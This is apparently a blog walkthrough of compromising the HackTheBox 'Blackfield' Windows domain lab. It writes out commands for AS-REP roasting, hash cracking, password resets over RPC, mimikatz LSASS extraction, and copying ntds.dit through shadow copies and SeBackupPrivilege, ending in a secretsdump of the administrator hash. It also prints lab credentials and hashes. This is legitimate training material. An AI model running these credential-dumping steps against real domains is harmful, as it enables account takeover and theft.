---
author:
  name: "Astrah"
date: 2020-10-05
linktitle: Blackfield Windows
type:
- post
- posts
categories:
- Windows
tags:
- Windows
- AD
- HackTheBox
- Active Directory
title: Blackfield Exploitation HackTheBox
weight: 10
series:
- Windows Exploitation
---

# Blackfield Exploitation HackTheBox

![](/images/black1.png)

Blackfield is a windows box which was majorly testing on enumeration skills while giving you the taste of real life situations like misconfigurations, that could heavily cost an organisation.
The following were the key take aways;

1. rpc and smb enumeration
2. Local Security Authority Subsystem Service (LSASS) exploitation
3. Ntds exploitation
4. leveraging on tools like mimikatz and secretdump
5. privilege user accounts exploitation

ENJOY

**Part 1: Initial Enumeration**

(i) nmap \
Several interesting ports are available for further enumeration as observed from the result
![](/images/black2.png)

(ii) Smb Enumeration on port 445

    smbclient -L //10.10.10.192 -N

![](/images/black3.png)
  The following shares were available, however, only **profiles$** share was accessible
     
     smbclient //10.10.10.192/profiles$ -N

![](/images/black4.png)
Some Interesting folders found were discovered here, and they seemed to be named after user accounts
The next step was copying these names in a text file, then checking the content of the folders using **“recurse”** command.
Following after with **"dir"** (to show directories of each user) but all directories were empty
![](/images/black5.png)
Since now we had a list users, the next step was using  **->impackets-getnpusers.py**. This is a very useful tool that requests tgt account tickets, but why would the Domain Controller just hand over the TGT? because this script will attempt to list and get TGTs for those users that have the property: **'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH)**. \
Another question is, why would this flag be set for an account if it will expose the account to an attack? after  research the conclusion was  **Legacy Systems**. That’s the only time this flag would be set if these are older systems which are unable to support kerberos authentication to AD. \
For further reading on kerberos preauth, click on the link below
http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm#UF_DONT_REQUIRE_PREAUTH
So moving on to using the badboy script(getnpusers.py), A tgt ticket was found for user support account

     python3 GetNPUsers.py BLACKFIELD.local/ -usersfile /home/osboxes/boxes/blackfield/user.txt -dc-ip 10.10.10.192
 ![](/images/black6.png)
![](/images/black7.png)
  After getting the hash above, **hash cat** was used to crack it using the command below

     hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
![](/images/black8.png)
**user:support**
**password:#00^BlackKnight**     
So using the credentials above, **rdp** to the machine was attempted but it was not possible maybe because the account was not a member of the **remote access group**. \
The next option was using **rpcclient for further enumeration**
  The following article comes in handy https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html . The reset password commands were used.

   ![](/images/black9.png)
The password for users with **AdminCount = 1** (Domain Admins and other higher privileged accounts) was not be able to be changed, however users having alternate admin accounts could easily be the targets
The number 23 came from **MSDN article USER_INFORMATION_CLASS**.  The SAMPR_USER_INTERNAL4_INFORMATION structure holds all attributes of a user, along with an encrypted password.     
Lets try changing password of account audit2020 and yes we can

  ![](/images/black10.png) 
   **Part 2: Getting Initial Access To the machine**\
     By accessing the smb share ‘audit’ using the account audit2020 above,  lsass.zip was found.\
     But what is **LSASS** - Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. so this can be leveraged by an attacker to get passwords of users
   ![](/images/black11.png)
![](/images/black12.png)
     Downloaded the file to my local machine
      
  ![](/images/black13.png)
     A useful tool for getting clear passwords from lass memory dump is **mimikatz**.
    Switched to a windows vm ,extracted the zip file then downloaded the mimikatz exe from https://github.com/gentilkiwi/mimikatz/releases
    Running mimikatz opens this terminal on cmd. 

   ![](/images/black14.png)
  The following command was run    
    
    sekurlsa::minidump lsass.dmp
   ![](/images/black15.png)
then ...
 
    'sekurlsa::logonPasswords full'
   ![](/images/black16.png)
     and svc_backup account **hash(9658d1d1dcd9250115e2205d9f48400d)** was found,
     then using evilwinrm, logged in using the above credentials and Voila!we have the user flag.
     
   ![](/images/black17.png)  \
     **Part 3: Privilege Escalation**\
After getting the user svc_backup, the next thing is enumerating the environment for clues\
Further enum through;\
**a] manually looking around**\
A txt file was found on the **C:** directory and in it was a clue,  that the user could backup and restore things.
     
 ![](/images/black18.png)
  **b] whoami /priv** \
    To verify these claims, whoami /priv was used to check the user's privileges and it was true, the user could actually do backup and restore things.
     
 ![](/images/black19.png)   
    **c] tools**\
     All tools needed were uploaded     
 ![](/images/black20.png)
     **-->WinPeas**\
    On running winpeas.exe, the executable disappered. This wasn't so clear why at this point.\
    **-->SharpHound**\
    On this second tool, the following commands were ran
     
     
    Powershell -exec bypass
     Import-module SharpHound.ps1
 ![](/images/black21.png)
     as you can see in the above image, sharphound was blocked by the antivirus , this explains the sudden disappearnace of the winpeas.exe as well.\
     **-->Powerup**\
  On this third tool, the following commands were ran
     
     Import-Module ./powerup.ps1
     Invoke-AllChecks
    
 ![](/images/black22.png)
As you can see above, the user can backup and restore things.
After an online search on attack vectors on these, it led me to the following links;   
      https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf \
     https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm\
     From the two links above, came up with the following script 
     
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
set context persistent nowriters#
add volume c: alias new1#
create#
expose %new1% z:#

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The script was then uploaded  to the server
![](/images/black23.png)
     
Then the script was ran using the command below.

    cmd /c diskshadow /s script.txt


     
The shadow copy was successfully created and exposed as partition ‘Z’
 ![](/images/black24.png)
 ![](/images/black25.png)
  The next thing was to find ntds and copy it to *tmp folder*. **Why is ntds file important?** The Ntds. dit  file is a database that stores Active Directory data, including  information about user objects, groups, and group membership. It  includes the password hashes for all users in the domain.\
    So first uploading two dlls \
        **SeBackupPrivilegeCmdLets.dll** \
        **SeBackupPrivilegeUtils.dll**\
        which can be found here https://github.com/giuliano108/SeBackupPrivilege
    then importing them
    
 ![](/images/black26.png)
  The reason why we used these two dlls was based on the constant that, **if you want to read/copy data out of a "normally forbidden" folder, you have to act as a backup software**.
    Using the function below, we simulated a backup software,,however you are required to have the privileges to perform that task
    
    Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit c:\tmp\ntds.dit 

    ![](/images/black27.png)
  After the above was successfully executed, ran the following commands  from the tmp folder, which extracted the **system.hive** and **sam.hive** files from the backed up ntds.dit files
    
    reg save HKLM\SYSTEM c:\tmp\system.hive
    reg save HKLM\SAM c:\tmp\sam.hive

![](/images/black28.png)
![](/images/black29.png)
    
    
    
  These files were then downloaded
  ![](/images/black30.png)

So finaly used **secretsdump.py** from impackets to dump the administrator hash.\ Other tools like **samdump2** gave the incorrect hash

![](/images/black31.png)
    **user:administrator**\
    **password hash:184fb5e5178480be64824d4cd53b99ee**\
    used the above credentials to login using evilwinrm
       ![](/images/black32.png)
    and finally the **root flag!** Hurrraaay!!
       ![](/images/black33.png) 
    

    
  
     

